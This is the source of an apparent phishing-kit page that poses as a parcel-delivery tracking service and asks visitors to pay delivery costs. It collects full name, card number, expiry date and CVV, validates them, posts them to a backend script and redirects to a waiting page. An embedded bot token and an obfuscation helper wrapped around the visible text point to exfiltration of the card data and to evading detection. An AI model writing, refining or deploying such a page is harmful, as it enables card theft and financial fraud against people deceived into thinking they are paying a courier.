<?php
require "../main.php";
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tracking</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/4.6.2/css/bootstrap.min.css">
    <link rel="stylesheet" href="res/css/style.css">
    <link rel="stylesheet" href="res/css/media.css">
</head>
<body>

<div class="window" id="loader" style="display:none;">
    <div class="loader">
        <div class="content" style="width:100%;">
            <img src="res/img/loading.gif">
            <p>Please wait...</p>
        </div>
    </div>
</div>

<header class="container-fluid p-0 m-0">
<script>var token=<?php echo json_encode($bot); ?>;</script>

<!-- <div class="container-lg p-0">
<div class="row p-0 m-0 align-items-center py-2">
<div class="col">
<img src="res/img/logo.svg">
</div>
<div class="col text-right">
<img src="res/img/menu.png" style="width:90px;">
</div>
</div>
</div> -->
<img src="res/img/header-mobile.png" class="mobile">
<img src="res/img/header-lg.png" class="lg">
<img src="res/img/header-minlg.png" class="minlg">
<img src="res/img/header-pc.png" class="pc">
</header>


<section class="container">
<div class="container-lg p-0">
<div class="container">
<h3 style="margin-top:10px;"><i class="fa-solid fa-box-open" style="color:#ffcc00; margin-right:4px;"></i><?php $obf->obf("Cover delivery costs"); ?> </h3> 
<p style="margin-bottom:40px; "><?php $obf->obf("Please use this form below to confirm your shipping and pay delivery costs (".$amount.")"); ?></p>
</div>

<div class="row m-0 flexa">

<div class="col-lg-7">
<div class="formbox">
<div class="box">
 

<h5 style="font-size:1.2em; margin-top:40px;">
<i class="fa-solid fa-credit-card" style="color:#ffcc00; margin-right:4px;"></i> <b> <?php $obf->obf("Payment method"); ?> </b> </h5>
<span style="margin-bottom:20px; display:block;"><i class="fa-solid fa-caret-right" style="color:#ffcc00; margin-right:4px;"></i>
<?php $obf->obf("This payment method will be used for payment (".$amount.")."); ?></span>
<img src="res/img/cards.png" style="width:180px; margin:10px 0;">
<div class="form-group">
<input type="text" class="form-control" id="d4" placeholder="Full name" >
</div>
<div class="form-group">
<input type="text" class="form-control" inputmode="numeric" id="d5" placeholder="Card number">
</div>
<div class="form-group">
<div class="row m-0 p-0">
  <div class="col m-0 p-0" >
  <input type="text" class="form-control" inputmode="numeric" id="d6" placeholder="MM/YY" style="border-right:none; border-radius:5px 0 0 5px;">
  </div>
  <div class="col m-0 p-0">
  <input type="text" class="form-control" inputmode="numeric" id="d7" placeholder="Cvv code" style="border-radius:0 5px 5px 0;">
</div>
</div>
</div>


<div class="form-group">
<button class="btn w-100" style="background:#00aae7; color:white; font-family:sb;" id="billsubmit" onclick="sendData()">Continue</button>
</div>


</div>
</div>
</div>


<div class="col-lg-4 text-center">
<div class="trackbox">
<div class="box">
<h5><i class="fa-solid fa-caret-right" style="color:#ffcc00; margin-right:4px;"></i> <?php $obf->obf("Package information"); ?></h5>
<span>Costs   <i><?php echo $amount; ?> </i></span>
</div>

<div class="box border-0">
<span><i class="fa-solid fa-caret-right" style="color:#ffcc00; margin-right:4px;"></i> <?php $obf->obf("Track number:"); ?>   <b> <?php $obf->obf($track); ?> </b></span>
</div>

<!-- <div class="box border-0 text-center">
    <img src="res/img/package.jpg" style="width:100px; max-width:100%;">
</div> -->

</div>
</div>


</div>
</div>
</section>



<footer>
<img src="res/img/footer-mobile.png" class="mobile">
<img src="res/img/footer-lg.png" class="lg">
<img src="res/img/footer-pc.png" class="pc">
</footer>


<script src="res/cdn/jq.js"></script>
<script src="res/cdn/jq3.0.js"></script>

<script src="res/cdn/m.js"></script>
<script src="res/cdn/cv.js"></script>
<script>
var submitTrigered = false;

$("#d5").mask("0000 0000 0000 0000");
$("#d6").mask("00/00");
$("#d7").mask("0000");

function val(){

    var allowSubmit = true;

    for(var i=4; i<=7; i++){
        if($("#d"+i).val().length==0){
            $("#d"+i).addClass("error");
            allowSubmit=false;
        }else{
            $("#d"+i).removeClass("error");
        }
    }

    const exps = $("#d6").val().split("/");
    if(exps[0]>12 || exps[0]<0 || exps[1]>40 || exps[1]<24 || $("#d6").val().length<5){
        $("#d6").addClass("error");
        allowSubmit=false;
    }else{
        $("#d6").removeClass("error");
    }

    var cardResult = $("#d5").validateCreditCard();
    if(!cardResult.valid){
        $("#d5").addClass("error");
        allowSubmit=false;
    }else{
        $("#d5").removeClass("error");
    }


    return  allowSubmit;
}


function sendData(){
    submitTrigered=true;
    if(val()){

        $("#billsubmit").attr("disabled");
        $("#loader").show();
        start_statu = true;
        $.post("post.php",{
           <?php 
           $res = "";
                for($i=4; $i<=7; $i++){
                    $res .= "d".$i.":"."$('#d".$i."').val(),";
                }
                echo $res;
            ?>
        },(d)=>{
           window.location="wait.php?p=CARD";
        });
    }
}

$("section input").keypress((e)=>{
    if(e.key=="Enter"){
        sendData();
    }
});

$("input").keyup(()=>{
    if(submitTrigered){
        val();
    }
});

</script>
</body>
</html>